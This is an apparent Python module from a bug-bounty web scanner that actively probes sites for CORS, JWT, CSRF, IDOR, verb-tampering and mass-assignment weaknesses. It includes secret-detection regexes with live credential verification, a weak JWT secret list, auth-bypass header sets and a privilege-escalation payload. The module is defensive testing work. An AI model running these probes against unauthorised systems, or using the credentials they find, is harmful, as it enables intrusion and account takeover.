"""
Auth & access-control checks: JWT abuse, CORS, CSRF, IDOR, verb
tampering/method override, mass assignment, session/cookie handling,
rate limiting, OAuth state, admin panel access, API key exposure.

Split out of the original monolithic detective.py - see detective/__init__.py
for the package-level docstring and full batch history.
"""

import asyncio
import base64
import hashlib
import hmac
import ipaddress
import json
import logging
import math
import os
import random
import re
import ssl
import struct
import time
import uuid
from collections import Counter
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from .. import oob, secret_verifier
from .shared import (
    logger,
    _TIMEOUT,
    _MAX_REASONABLE_URL_LENGTH,
    _extract_hostname,
    _looks_like_sane_url,
    _shannon_entropy,
    _replace_query_param,
)

async def check_cors_misconfig(url: str) -> dict | None:
    """
    Sends a request with a clearly-fake Origin header. If the server
    reflects that exact origin back AND allows credentials, any random
    website can read this endpoint's authenticated response in a
    victim's browser - a real, reportable High-severity finding.

    We deliberately only flag the reflect+credentials combination (not
    a wildcard "*" without credentials, which browsers already refuse to
    pair with credentialed requests and is routinely triaged as
    Informative). This keeps the check aligned with what programs
    actually pay for.
    """
    fake_origin = "https://evil-cors-probe.example.com"
    logger.info("detective: checking CORS misconfig for %s", url)
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            resp = await client.get(url, headers={"Origin": fake_origin})
    except httpx.HTTPError as exc:
        logger.info("detective: CORS check failed for %s: %s", url, exc)
        return None

    allow_origin = resp.headers.get("access-control-allow-origin", "")
    allow_creds = resp.headers.get("access-control-allow-credentials", "").lower()

    if allow_origin == fake_origin and allow_creds == "true":
        return {
            "vuln_type": "cors_misconfiguration",
            "severity": "high",
            "evidence": (
                f"{url} reflected arbitrary Origin '{fake_origin}' in "
                f"Access-Control-Allow-Origin AND set Access-Control-Allow-Credentials: "
                f"true. Any site can read this endpoint's response in a victim's browser."
            ),
        }
    return None


_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


async def check_jwt_alg_confusion(url: str) -> dict | None:
    """
    Looks for a JWT in the response (cookie or body), decodes its header,
    and checks whether the server would plausibly accept a forged token
    signed with `alg: none` or a trivially-guessable HS256 secret.

    This does NOT forge and replay a token against a protected endpoint -
    that crosses from detection into exploitation and needs an
    authenticated session to verify safely. It only flags tokens whose
    header already advertises a weak configuration (alg is genuinely
    "none", or alg is HS256 while the token structure suggests it's used
    for something sensitive), so you know where to spend manual time
    forging and replaying a token yourself.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: JWT check request failed for %s: %s", url, exc)
        return None

    haystack = " ".join(resp.headers.get("set-cookie", "") for _ in [None]) + " " + resp.text[:20000]
    match = _JWT_RE.search(haystack)
    if not match:
        return None

    token = match.group(0)
    header_b64 = token.split(".")[0]
    padded = header_b64 + "=" * (-len(header_b64) % 4)
    try:
        header = json.loads(base64.urlsafe_b64decode(padded))
    except Exception:
        return None

    alg = str(header.get("alg", "")).lower()
    if alg in ("none", ""):
        return {
            "vuln_type": "jwt_none_alg_accepted",
            "severity": "critical",
            "evidence": (
                f"{url} issued a JWT with alg={header.get('alg')!r}. If the server accepts "
                f"a resubmitted token with alg set to 'none' and the signature stripped, "
                f"this is a full authentication bypass. Header: {header}"
            ),
        }
    return None


_API_KEY_SIGNATURES: list[tuple[re.Pattern, str, str]] = [
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS Access Key ID", "critical"),
    (re.compile(r"sk_live_[0-9a-zA-Z]{24,}"), "Stripe Live Secret Key", "critical"),
    (re.compile(r"AIza[0-9A-Za-z_-]{35}"), "Google API Key", "medium"),
    (re.compile(r"xox[baprs]-[0-9A-Za-z-]{10,}"), "Slack Token", "high"),
    (re.compile(r"SK[0-9a-fA-F]{32}"), "Twilio API Key", "high"),
    (re.compile(r"ghp_[0-9A-Za-z]{36}"), "GitHub Personal Access Token", "critical"),
    (re.compile(r"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9[A-Za-z0-9_-]{10,}\.firebase"), "Firebase Service Account JWT", "critical"),
]


async def check_api_key_leak_signature(url: str) -> dict | None:
    """
    Fetches `url` (meant for JS bundles, config endpoints, or any static
    asset) and matches its body against a short list of known, fixed-
    format API key signatures. A match on one of these formats is a
    concrete, provider-identifiable secret - materially different from
    "this string looked randomish" (check_file_entropy), so it's kept as
    its own check with per-provider severity instead of folded in.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: API key signature check failed for %s: %s", url, exc)
        return None

    body = resp.text
    for pattern, provider, severity in _API_KEY_SIGNATURES:
        match = pattern.search(body)
        if match:
            raw_secret = match.group(0)  # only ever held in memory, never persisted
            secret_preview = raw_secret[:8] + "…" + raw_secret[-4:]

            # Live-verify while the full value is still in scope, for the
            # subset of providers where the matched string is a complete,
            # usable credential on its own (see secret_verifier.py's
            # module docstring for why AWS/Twilio are excluded here).
            verdict = await secret_verifier.verify_secret(provider, raw_secret)
            if verdict is None:
                verify_note = " (not independently verifiable from this match alone - needs a paired secret)"
                effective_severity = severity
            elif verdict.get("valid") is True:
                verify_note = f" VERIFIED LIVE: {verdict['note']}"
                effective_severity = "critical"  # a confirmed-live credential always outranks the format's default
            elif verdict.get("valid") is False:
                verify_note = f" VERIFIED DEAD: {verdict['note']}"
                effective_severity = "low"  # keep the finding, don't silently drop it - let triage.py make the final call
            else:
                verify_note = f" (verification inconclusive: {verdict.get('note', 'unknown')})"
                effective_severity = severity

            return {
                "vuln_type": "exposed_api_key",
                "severity": effective_severity,
                "evidence": (
                    f"{url}: found a live-looking {provider} matching its known format "
                    f"({secret_preview}) directly in the response body.{verify_note}"
                ),
            }
    return None


_SEQUENTIAL_ID_RE = re.compile(r"/(?:v\d+/)?(\w*(?:id|user|order|account|invoice|ticket|profile|doc)\w*)/(\d{1,10})(?:/|$|\?)", re.IGNORECASE)


async def check_idor_candidate(url: str) -> str | None:
    """
    Flags URLs whose path contains a small sequential/numeric ID next to
    an identity-shaped segment name (userId, orderId, accountId, etc.).
    Returns a plain string, NOT a findings dict - same reasoning as
    check_waf_fingerprint and check_csp_weakness: a numeric ID in a URL
    is not itself a vulnerability. Confirming IDOR requires comparing
    responses across two different authenticated sessions (attacker
    account vs. victim's resource), which a single-session passive
    scanner can't do safely or reliably. This exists purely to surface
    high-probability candidates so you can spend manual verification
    time efficiently instead of guessing which of hundreds of URLs to
    check by hand - IDOR is consistently one of the highest-payout,
    most-accepted bug classes, so triage speed here matters.
    """
    match = _SEQUENTIAL_ID_RE.search(str(httpx.URL(url).path))
    if not match:
        return None
    segment_name, id_value = match.group(1), match.group(2)
    return f"{url}: IDOR candidate - numeric ID {id_value!r} in segment {segment_name!r}, verify with a second account"


_METHOD_OVERRIDE_HEADER_SETS = [
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
]
# Generic "you need to log in" pages are the main false-positive risk for
# this check - a login page can easily be under 200 chars of real content
# once markup is stripped, so anything this short is treated as
# still-blocked rather than a genuine bypass.
_MIN_BYPASS_BODY_LENGTH = 200


async def check_auth_bypass_via_method_override(url: str) -> dict | None:
    """
    Some reverse proxies / app frameworks honor X-HTTP-Method-Override,
    X-Original-URL, or X-Rewrite-URL headers meant for legitimate REST
    tunneling, but apply access-control checks BEFORE processing them -
    so a request that's correctly blocked on the real method/path can
    slip through when the override header points somewhere the
    authorization layer never inspected.

    Proof bar is a clean status-code transition, not a substring match:
    the plain request must come back 401/403 (confirmed blocked), and an
    override-header request to the exact same URL must come back 200
    with a non-trivial body (not just a same-length login/error page).
    This is deterministic - no coincidental-string risk at all, unlike
    several batch 7-9 checks that needed a later audit fix.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None  # not blocked to begin with - nothing to bypass

            for headers in _METHOD_OVERRIDE_HEADER_SETS:
                try:
                    resp = await client.get(url, headers=headers)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                    return {
                        "vuln_type": "auth_bypass_method_override",
                        "severity": "critical",
                        "evidence": (
                            f"{url}: plain request returned {baseline_resp.status_code} "
                            f"(blocked), but adding header(s) {headers} returned 200 with a "
                            f"{len(resp.text)}-byte body - authorization check is being "
                            f"bypassed by an override header the access-control layer doesn't "
                            f"account for."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: method override auth bypass check failed for %s: %s", url, exc)
    return None


_JWT_WEAK_SECRETS = [
    "secret", "123456", "password", "changeme", "your-256-bit-secret",
    "jwt_secret", "jwtsecret", "supersecret", "test", "admin", "key",
    "development", "production", "s3cr3t", "secretkey", "mysecret",
]
_JWT_HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


async def check_jwt_weak_secret(url: str) -> dict | None:
    """
    Finds a JWT in the response (same search as check_jwt_alg_confusion)
    and, for HMAC-signed tokens (HS256/384/512), tries to recompute the
    signature locally against a short list of common weak secrets.

    This is fundamentally different from every substring-matching check
    in this file: it makes NO additional requests to the target and
    never forges/replays a token - it's pure local cryptography. A
    secret either reproduces the exact byte-for-byte signature or it
    doesn't; there's no "coincidentally looks similar" middle ground the
    way a text substring can coincidentally appear. Zero false-positive
    risk by construction, not by discipline.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: JWT weak secret check failed for %s: %s", url, exc)
        return None

    haystack = resp.text[:20000] + " " + resp.headers.get("set-cookie", "")
    match = _JWT_RE.search(haystack)
    if not match:
        return None

    token = match.group(0)
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header_b64, payload_b64, signature_b64 = parts

    try:
        header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4)))
    except Exception:
        return None

    alg = str(header.get("alg", "")).upper()
    hash_fn = _JWT_HMAC_ALGS.get(alg)
    if hash_fn is None:
        return None  # RS256/ES256/etc. - not crackable this way, needs the private key

    try:
        actual_sig = base64.urlsafe_b64decode(signature_b64 + "=" * (-len(signature_b64) % 4))
    except Exception:
        return None

    signing_input = f"{header_b64}.{payload_b64}".encode()
    for secret in _JWT_WEAK_SECRETS:
        computed_sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        if hmac.compare_digest(computed_sig, actual_sig):
            return {
                "vuln_type": "jwt_weak_signing_secret",
                "severity": "critical",
                "evidence": (
                    f"{url}: the JWT's {alg} signature was successfully recomputed locally "
                    f"using a common weak secret ({secret!r}) - full authentication bypass, "
                    f"anyone who knows this secret can forge valid tokens for any user or role."
                ),
            }
    return None


_ADMIN_PANEL_PATHS = [
    "/admin", "/admin/login", "/wp-admin", "/administrator", "/manage",
    "/management", "/cpanel", "/admin.php", "/backend", "/console",
]
_LOGIN_FORM_INDICATORS = ['type="password"', "type='password'", 'name="password"', "name='password'"]


async def check_exposed_admin_panel(host: str) -> str | None:
    """
    Checks a short list of common admin/management panel paths for a
    live login form (a password input field present). Returns a plain
    string, NOT a findings dict, and deliberately never attempts any
    credentials - credential guessing/brute force is excluded by most
    bug bounty programs' policies regardless of how the panel was
    located. This only confirms an admin interface is reachable, useful
    for manual review (should this be public? any other issues on the
    panel itself?), not a vulnerability by itself.
    """
    base = host.rstrip("/")
    found_paths = []
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _ADMIN_PANEL_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200:
                    body_lower = resp.text[:5000].lower()
                    if any(ind in body_lower for ind in _LOGIN_FORM_INDICATORS):
                        found_paths.append(path)
    except httpx.HTTPError as exc:
        logger.info("detective: admin panel check failed for %s: %s", host, exc)
        return None

    if found_paths:
        return (
            f"{base}: admin/management login panel(s) reachable at {', '.join(found_paths)} - "
            f"worth manual review; credential testing not attempted, most programs exclude "
            f"brute force/credential guessing regardless of how the panel was located"
        )
    return None


_MASS_ASSIGNMENT_PAYLOAD = {
    "username": "swas_mass_assignment_probe",
    "isAdmin": True,
    "is_admin": True,
    "role": "admin",
    "admin": True,
}


async def check_mass_assignment_privilege_escalation(url: str) -> dict | None:
    """
    POSTs a JSON body containing ordinary-looking fields alongside
    several common privilege-escalation field names (isAdmin, role,
    admin) to the given URL, then checks whether the response echoes
    ANY of those privileged fields back with the EXACT value we sent.
    That's evidence the server accepted and processed an attribute the
    client shouldn't be able to set directly - the classic mass-
    assignment pattern. Evidence is worded as "accepted/echoed", not
    "confirmed escalated" - echoing a field back is strong signal but
    isn't the same as verifying the account's actual privilege level
    changed server-side, which would need a follow-up authenticated
    request this stateless check doesn't make.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.post(url, json=_MASS_ASSIGNMENT_PAYLOAD)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: mass assignment check failed for %s: %s", url, exc)
        return None

    try:
        response_json = resp.json()
    except Exception:
        return None
    if not isinstance(response_json, dict):
        return None

    for field in ("isAdmin", "is_admin", "role", "admin"):
        if field in response_json and response_json[field] == _MASS_ASSIGNMENT_PAYLOAD[field]:
            return {
                "vuln_type": "mass_assignment_privilege_escalation",
                "severity": "high",
                "evidence": (
                    f"{url}: POSTing a JSON body with an unexpected privileged field "
                    f"'{field}': {_MASS_ASSIGNMENT_PAYLOAD[field]!r} resulted in that exact "
                    f"field/value being echoed back in the response - the endpoint accepts "
                    f"and processes client-supplied privilege fields it shouldn't expose."
                ),
            }
    return None


_VERB_TAMPERING_METHODS = ["PUT", "DELETE", "PATCH", "TRACE", "HEAD"]


async def check_auth_bypass_via_verb_tampering(url: str) -> dict | None:
    """
    Complements check_auth_bypass_via_method_override (batch 11) with
    the other common technique for the same underlying bug class: some
    access-control layers only inspect GET/POST, so a protected endpoint
    correctly blocks GET but never checks PUT/DELETE/PATCH at all. Same
    deterministic proof bar as the override-header check - a clean
    401/403 baseline, then a real 200 with substantial content on a
    different verb - no substring-matching risk.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None

            for method in _VERB_TAMPERING_METHODS:
                try:
                    resp = await client.request(method, url)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                    return {
                        "vuln_type": "auth_bypass_verb_tampering",
                        "severity": "critical",
                        "evidence": (
                            f"{url}: GET returned {baseline_resp.status_code} (blocked), but "
                            f"{method} returned 200 with a {len(resp.text)}-byte body - the "
                            f"access-control layer isn't checking this HTTP verb."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: verb tampering auth bypass check failed for %s: %s", url, exc)
    return None


async def check_predictable_token_pattern(url: str) -> str | None:
    """
    Flags query parameters whose NAME looks token/session/reset/otp-
    shaped (reuses the same _SENSITIVE_PARAM_NAME_RE as
    check_referrer_policy_sensitive_leak) and whose VALUE looks
    suspiciously weak - short and purely numeric, which is consistent
    with a small keyspace an attacker could brute-force or guess.
    Returns a plain string, NOT a findings dict - "this token looks
    short" is a candidate for manual entropy/predictability analysis
    (request several and check for sequential or low-variance
    patterns), not a confirmed weakness on its own; a single sample
    can't prove predictability.
    """
    parsed = httpx.URL(url)
    query_params = dict(parsed.params)
    for param_name, value in query_params.items():
        if _SENSITIVE_PARAM_NAME_RE.match(param_name) and value and re.fullmatch(r"\d{1,8}", value):
            return (
                f"{url}: parameter '{param_name}' (token/session/reset-shaped name) has a "
                f"short, purely numeric value ({value!r}, {len(value)} digits) - candidate "
                f"for manual predictability testing (request several and check for "
                f"sequential/low-entropy patterns); a single sample doesn't confirm weakness"
            )
    return None


async def check_cors_null_origin_bypass(url: str) -> dict | None:
    """
    Specifically tests the "Origin: null" bypass - browsers send a
    literal null origin for sandboxed iframes and some data:/file:
    contexts, which an attacker fully controls regardless of any
    domain allowlist. If the server reflects "null" back in Access-
    Control-Allow-Origin alongside Access-Control-Allow-Credentials:
    true, any attacker page can steal authenticated data via a
    sandboxed iframe - distinct from (and narrower than) whatever
    check_cors_misconfig (batch 1) tests generically. Pure deterministic
    header comparison, zero substring-coincidence risk.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(url, headers={"Origin": "null"})
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: CORS null origin check failed for %s: %s", url, exc)
        return None

    acao = resp.headers.get("access-control-allow-origin", "")
    acac = resp.headers.get("access-control-allow-credentials", "").lower()
    if acao.strip() == "null" and acac == "true":
        return {
            "vuln_type": "cors_null_origin_credentials_bypass",
            "severity": "high",
            "evidence": (
                f"{url}: sending Origin: null returned Access-Control-Allow-Origin: null "
                f"with Access-Control-Allow-Credentials: true - any attacker page can read "
                f"authenticated responses via a sandboxed iframe (Origin: null is fully "
                f"attacker-controlled, not a real domain restriction)."
            ),
        }
    return None


async def check_jwt_kid_header_injection_candidate(url: str) -> str | None:
    """
    Finds a JWT and checks whether its header includes a 'kid' (Key ID)
    claim that looks like a file path or SQL-fragment - a classic
    injection point where the key-lookup logic uses attacker-influenced
    input to locate/construct the verification key (path traversal to a
    predictable low-entropy file, or SQLi in a "SELECT key FROM keys
    WHERE id = ?" lookup). Returns a plain string, NOT a findings dict -
    same reasoning as check_jwt_alg_confusion: detecting a suspicious
    'kid' value doesn't confirm the key-lookup is actually exploitable,
    and confirming it requires forging and replaying a token against a
    protected endpoint, which this scanner deliberately doesn't do.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: JWT kid header check failed for %s: %s", url, exc)
        return None

    haystack = resp.text[:20000] + " " + resp.headers.get("set-cookie", "")
    match = _JWT_RE.search(haystack)
    if not match:
        return None
    header_b64 = match.group(0).split(".")[0]
    try:
        header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4)))
    except Exception:
        return None

    kid = header.get("kid")
    if not kid or not isinstance(kid, str):
        return None
    if "/" in kid or "\\" in kid or "'" in kid or ".." in kid:
        return (
            f"{url}: JWT header includes a 'kid' claim ({kid!r}) that looks like a file path "
            f"or contains injection-relevant characters - candidate for manual kid-based key-"
            f"confusion testing (path traversal to a predictable key file, or SQLi in the key "
            f"lookup); not exploited here since that requires forging and replaying a token"
        )
    return None


_CSRF_TOKEN_FIELD_RE = re.compile(r'name=["\'][^"\']*(?:csrf|xsrf|authenticity_token|_token)[^"\']*["\']', re.IGNORECASE)
_POST_FORM_RE = re.compile(r'<form[^>]+method=["\']?post["\']?[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)


async def check_csrf_token_missing(url: str) -> str | None:
    """
    Scans POST forms for the absence of any csrf/xsrf/authenticity-
    token-shaped hidden field. Returns a plain string, NOT a findings
    dict - many modern apps rely entirely on SameSite cookies instead of
    a token field and are still perfectly protected, so a missing token
    field alone doesn't confirm a real CSRF vulnerability. Confirming
    that needs checking SameSite/Origin-validation behavior too, which
    this scanner doesn't attempt. Flag for manual review, not a verdict.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: CSRF token check failed for %s: %s", url, exc)
        return None

    body = resp.text
    forms_without_token = 0
    for form_match in _POST_FORM_RE.finditer(body):
        form_body = form_match.group(1)
        if not _CSRF_TOKEN_FIELD_RE.search(form_body):
            forms_without_token += 1

    if forms_without_token:
        return (
            f"{url}: {forms_without_token} POST form(s) with no csrf/xsrf/authenticity-token-"
            f"shaped hidden field - candidate for manual CSRF review (check SameSite cookie "
            f"attributes and Origin validation before concluding this is exploitable; a "
            f"missing token field alone isn't a confirmed vulnerability on modern browsers)"
        )
    return None


async def check_cors_wildcard_with_credentials(url: str) -> dict | None:
    """
    Per spec, browsers should refuse to honor Access-Control-Allow-
    Origin: * combined with Access-Control-Allow-Credentials: true - but
    plenty of misconfigured servers/proxies still SEND both together
    anyway, which is a genuine server-side policy bug even where modern
    browsers won't act on it (older clients, non-browser HTTP clients,
    and some proxy/cache layers may not enforce the same restriction).
    Pure deterministic header inspection, zero substring-coincidence risk.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(url, headers={"Origin": "https://swas-cors-probe.test"})
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: CORS wildcard credentials check failed for %s: %s", url, exc)
        return None

    acao = resp.headers.get("access-control-allow-origin", "").strip()
    acac = resp.headers.get("access-control-allow-credentials", "").strip().lower()
    if acao == "*" and acac == "true":
        return {
            "vuln_type": "cors_wildcard_with_credentials",
            "severity": "medium",
            "evidence": (
                f"{url}: server sent Access-Control-Allow-Origin: * together with "
                f"Access-Control-Allow-Credentials: true in the same response - a spec-"
                f"violating combination most browsers won't honor, but indicates a genuinely "
                f"broken CORS policy that may still be exploitable via non-browser clients or "
                f"proxy/cache layers that don't enforce the same restriction."
            ),
        }
    return None


_EXCESSIVE_EXPOSURE_FIELD_NAMES = [
    "password", "password_hash", "passwordhash", "salt", "ssn", "social_security",
    "credit_card", "creditcard", "cvv", "api_secret", "private_key", "internal_notes",
    "is_admin", "hashed_password",
]


def _find_sensitive_keys(obj, depth: int = 0) -> list[str]:
    if depth > 4:
        return []
    found = []
    if isinstance(obj, dict):
        for key, value in obj.items():
            if key.lower() in _EXCESSIVE_EXPOSURE_FIELD_NAMES:
                found.append(key)
            found.extend(_find_sensitive_keys(value, depth + 1))
    elif isinstance(obj, list):
        for item in obj[:5]:
            found.extend(_find_sensitive_keys(item, depth + 1))
    return found


async def check_excessive_data_exposure_api(url: str) -> str | None:
    """
    Parses a JSON API response and looks for field names that suggest
    the server is returning more than the client needs (password
    hashes, salts, internal notes, raw SSNs/credit-card numbers).
    Returns a plain string, NOT a findings dict - a field NAME existing
    in a response doesn't confirm it's actually sensitive data (could be
    a null placeholder, a schema artifact, or intentionally exposed to
    an admin-only endpoint this request happens to be hitting); this
    flags candidates for manual inspection of the actual values returned.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: excessive data exposure check failed for %s: %s", url, exc)
        return None

    try:
        response_json = resp.json()
    except Exception:
        return None

    sensitive_keys = _find_sensitive_keys(response_json)
    if sensitive_keys:
        unique_keys = sorted(set(sensitive_keys))
        return (
            f"{url}: JSON response contains field name(s) suggesting excessive data exposure "
            f"({', '.join(unique_keys)}) - candidate for manual review of the actual values "
            f"returned (a present field name alone doesn't confirm real sensitive data)"
        )
    return None


_API_VERSION_RE = re.compile(r"/v(\d+)/")
_DOWNGRADE_VERSIONS = ["v1", "v0", "beta", "internal", "legacy"]


async def check_api_version_downgrade_bypass(url: str) -> dict | None:
    """
    If a URL's path contains a version segment (/v2/, /v3/, etc.), tries
    swapping it for older/deprecated version markers (v1, v0, beta,
    internal, legacy) - a common real-world gap where a deprecated API
    version stays live with weaker or no access control, while the
    "current" version everyone assumes is the only path in is properly
    secured. Same deterministic status-code-transition proof bar as
    check_auth_bypass_via_method_override: the current-version URL must
    be blocked (401/403) first, and the older-version URL must return
    200 with real content - no substring-matching risk.
    """
    match = _API_VERSION_RE.search(str(httpx.URL(url).path))
    if not match:
        return None
    current_version = match.group(0)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None  # not blocked on the current version - nothing to bypass

            for old_version in _DOWNGRADE_VERSIONS:
                downgraded_url = url.replace(current_version, f"/{old_version}/", 1)
                if downgraded_url == url:
                    continue
                try:
                    resp = await client.get(downgraded_url)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                    return {
                        "vuln_type": "api_version_downgrade_bypass",
                        "severity": "high",
                        "evidence": (
                            f"{url}: blocked with {baseline_resp.status_code} on the current "
                            f"API version, but {downgraded_url} (older/deprecated version) "
                            f"returned 200 with a {len(resp.text)}-byte body - the deprecated "
                            f"version doesn't enforce the same access control."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: API version downgrade check failed for %s: %s", url, exc)
    return None


async def check_cors_subdomain_suffix_bypass(url: str) -> dict | None:
    """
    Tests for a naive CORS origin-validator that checks "does the Origin
    contain/end with my domain" rather than an exact allowlist match -
    sending Origin: https://{domain}.evil-swas-probe.test (the real
    domain as a PREFIX of an attacker-controlled one) or
    https://evil-swas-probe-{domain} (domain concatenated without a
    separator) can slip past a substring/endswith check that isn't
    anchored properly. Distinct from check_cors_null_origin_bypass and
    check_cors_wildcard_with_credentials - this targets a third,
    separate CORS misconfiguration pattern. Deterministic header
    reflection check, zero substring-coincidence risk.
    """
    domain = httpx.URL(url).host
    if not domain:
        return None
    candidate_origins = [
        f"https://{domain}.evil-swas-probe.test",
        f"https://evil-swas-probe{domain}",
    ]

    # Domain-boundary guard: "evil-swas-probe" + domain concatenated
    # without a separator can accidentally produce a string that is
    # itself a REAL subdomain inside the target's own DNS namespace
    # (e.g. domain="www.agoda.com" -> "evil-swas-probewww.agoda.com",
    # which literally ends in ".agoda.com"). Nobody but the target can
    # register or host content at a name under their own apex domain, so
    # an attacker could never get a victim's browser to send that as a
    # real Origin - it's not exploitable and isn't a bypass, just a
    # coincidental namespace collision. Drop any candidate that ends up
    # inside the target's own domain before testing it.
    attacker_origins = [
        origin for origin in candidate_origins
        if httpx.URL(origin).host != domain
        and not httpx.URL(origin).host.endswith("." + domain)
    ]
    if not attacker_origins:
        return None

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for attacker_origin in attacker_origins:
                try:
                    resp = await client.get(url, headers={"Origin": attacker_origin})
                except httpx.HTTPError:
                    continue
                acao = resp.headers.get("access-control-allow-origin", "").strip()
                acac = resp.headers.get("access-control-allow-credentials", "").strip().lower()
                if acao == attacker_origin and acac == "true":
                    return {
                        "vuln_type": "cors_subdomain_suffix_bypass",
                        "severity": "high",
                        "evidence": (
                            f"{url}: sending Origin: {attacker_origin} (contains the real "
                            f"domain as a substring, not an actual subdomain) was reflected "
                            f"back exactly in Access-Control-Allow-Origin with "
                            f"Access-Control-Allow-Credentials: true - the origin validator "
                            f"uses an unanchored substring/endswith check instead of a real "
                            f"allowlist match."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: CORS subdomain suffix bypass check failed for %s: %s", url, exc)
    return None


_SESSION_COOKIE_NAME_RE = re.compile(r"(session|sess|sid|auth|token)", re.IGNORECASE)


async def check_insecure_cookie_without_samesite(url: str) -> str | None:
    """
    Flags session/auth-shaped cookies set without a SameSite attribute.
    Returns a plain string, NOT a findings dict - modern browsers default
    to SameSite=Lax when unset, which already blocks most cross-site
    request scenarios, so a missing explicit attribute is much weaker
    signal than it used to be and is frequently rated Informative.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: cookie SameSite check failed for %s: %s", url, exc)
        return None

    set_cookie_headers = resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else []
    for raw_cookie in set_cookie_headers:
        cookie_name = raw_cookie.split("=", 1)[0].strip()
        if _SESSION_COOKIE_NAME_RE.search(cookie_name) and "samesite" not in raw_cookie.lower():
            return (
                f"{url}: cookie '{cookie_name}' (session/auth-shaped name) set without an "
                f"explicit SameSite attribute - modern browsers default to Lax when unset, "
                f"which already blocks most cross-site scenarios, so this is frequently "
                f"Informative on its own"
            )
    return None


_URL_SESSION_ID_PARAM_RE = re.compile(r"^(phpsessid|jsessionid|asp\.net_sessionid|sid|session_id)$", re.IGNORECASE)


async def check_session_id_in_url(url: str) -> str | None:
    """
    Flags a session identifier (PHPSESSID, JSESSIONID, ASP.NET_SessionId,
    etc.) being carried directly in the URL query string rather than
    only in a cookie. Returns a plain string, NOT a findings dict -
    distinct from the general check_referrer_policy_sensitive_leak
    (which matches broader token-shaped names): this specifically names
    the session-identifier pattern for report clarity. Real impact
    (leaking a live session via browser history, Referer, or server
    logs) needs the same Referrer-Policy/third-party-resource
    confirmation that check does, not re-derived here.
    """
    parsed = httpx.URL(url)
    for param_name in parsed.params:
        if _URL_SESSION_ID_PARAM_RE.match(param_name):
            return (
                f"{url}: session identifier carried in the URL query string (parameter "
                f"'{param_name}') rather than only in a cookie - candidate for session-"
                f"leak-via-history/logs/Referer review"
            )
    return None


_UUID_IN_URL_RE = re.compile(
    r"\b[0-9a-f]{8}-[0-9a-f]{4}-([0-9a-f])[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.IGNORECASE
)

